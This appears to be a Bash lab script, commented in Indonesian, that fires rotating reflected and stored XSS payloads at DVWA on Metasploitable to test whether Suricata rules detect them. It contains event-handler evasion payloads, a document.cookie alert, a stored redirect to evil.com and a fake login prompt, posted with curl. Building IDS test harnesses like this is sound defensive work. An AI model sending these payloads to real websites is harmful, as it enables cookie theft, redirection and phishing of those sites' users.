#!/bin/bash

# =================================================================
# MODUL 05: CROSS-SITE SCRIPTING (XSS) - ROTASI PAYLOAD
# Strategi: 3 Level Depth (Reflected, Obfuscated, Stored/POST)
# Input: Menerima argumen $1 sebagai Nomor Ronde
# =================================================================

# Menerima Input Nomor Ronde dari Daily Round
ROUND=${1:-1} # Default ke ronde 1 jika kosong

# KONFIGURASI
TARGET_IP="192.168.x.x"   # Ganti dengan IP Metasploitable
# Masukkan PHPSESSID dari login DVWA (Sama seperti modul SQLmap)
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"
LOG_FILE="logs/xss_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
# Mengubah Tag HTML (Level 2) & Payload Stored (Level 3)
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Ronde 1-10) ---
    # Level 2: Image OnError (Standard Evasion)
    PAYLOAD_RAW_L2="<img src=x onerror=alert(1)>"
    PAYLOAD_ENC_L2="%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
    DESC_L2="Evasion: IMG Tag OnError"
    
    # Level 3: Stored Cookie Alert
    NAME_L3="HackerA"
    PAYLOAD_RAW_L3="<script>alert(document.cookie)</script>"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Ronde 11-20) ---
    # Level 2: SVG OnLoad (HTML5 Vector)
    PAYLOAD_RAW_L2="<svg/onload=alert(1)>"
    PAYLOAD_ENC_L2="%3Csvg%2Fonload%3Dalert(1)%3E"
    DESC_L2="Evasion: SVG Tag OnLoad"
    
    # Level 3: Stored Redirect
    NAME_L3="HackerB"
    PAYLOAD_RAW_L3="<script>window.location='http://evil.com'</script>"

else
    # --- SET C (Ronde 21-30) ---
    # Level 2: Body OnLoad (Context Evasion)
    PAYLOAD_RAW_L2="<body onload=alert(1)>"
    PAYLOAD_ENC_L2="%3Cbody%20onload%3Dalert(1)%3E"
    DESC_L2="Evasion: BODY Tag OnLoad"
    
    # Level 3: Stored Phishing Form
    NAME_L3="HackerC"
    PAYLOAD_RAW_L3="<script>prompt('Please login again')</script>"
fi

echo "[+] [05_XSS] Memulai Skenario XSS Injection..."
echo "[+] Target IP: $TARGET_IP"
echo "[+] Mode: Ronde $ROUND ($DESC_L2)"

# Cek Cookie
if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
   echo -e "${RED}[!] WARNING: Cookie belum di-set! Script akan gagal login DVWA.${NC}"
   sleep 5
fi

# -----------------------------------------------------------------
# LEVEL 1: REFLECTED XSS (BASIC - BASELINE)
# Tujuan: Baseline. Menguji deteksi tag standar <script> di URL.
# Payload: <script>alert('XSS')</script>
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic Reflected XSS...${NC}"

# Payload Level 1 Selalu Tetap (Baseline)
PAYLOAD_RAW="<script>alert('XSS')</script>"
PAYLOAD_ENC="%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD_ENC"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Asli]   : $PAYLOAD_RAW${NC}"
echo -e "${YELLOW}    [Payload Kirim]  : $PAYLOAD_ENC${NC}"
echo -e "${YELLOW}    [Metode]         : HTTP GET${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl1_r${ROUND}.html
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER Script tag in URI)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: REFLECTED XSS (EVASION - DINAMIS)
# Tujuan: Menguji rule pada tag selain <script>.
# Teknik: Menggunakan variabel payload dinamis ($PAYLOAD_ENC_L2).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"

# URL Level 2 menggunakan variabel dinamis
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD_ENC_L2"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Asli]   : $PAYLOAD_RAW_L2${NC}"
echo -e "${YELLOW}    [Payload Kirim]  : $PAYLOAD_ENC_L2${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Menggunakan Event Handler non-standar${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl2_r${ROUND}.html
echo "    -> Selesai. (Harapan: Deteksi via pola event handler)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: STORED XSS (POST METHOD - DINAMIS)
# Tujuan: Menguji deteksi pada HTTP BODY dengan konten berubah.
# Teknik: Mengirim payload via POST ke Guestbook DVWA.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Stored XSS via POST (HTTP Body)...${NC}"

URL_STORED="http://$TARGET_IP/dvwa/vulnerabilities/xss_s/"
# Menyusun body POST menggunakan variabel dinamis
PAYLOAD_BODY="txtName=$NAME_L3&mtxMessage=$PAYLOAD_RAW_L3&btnSign=Sign+Guestbook"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Target URL]     : $URL_STORED${NC}"
echo -e "${YELLOW}    [POST Data Body] : $PAYLOAD_BODY${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Payload disisipkan di dalam Body Request${NC}"

# Eksekusi
curl -s -X POST -b "$COOKIE" -d "$PAYLOAD_BODY" "$URL_STORED" -o logs/xss_lvl3_r${ROUND}.html
echo "    -> Selesai. (Harapan: Suricata menginspeksi HTTP Request Body)"

echo "[+] [05_XSS] Skenario Selesai pada $(date)"
echo "-----------------------------------------------------------"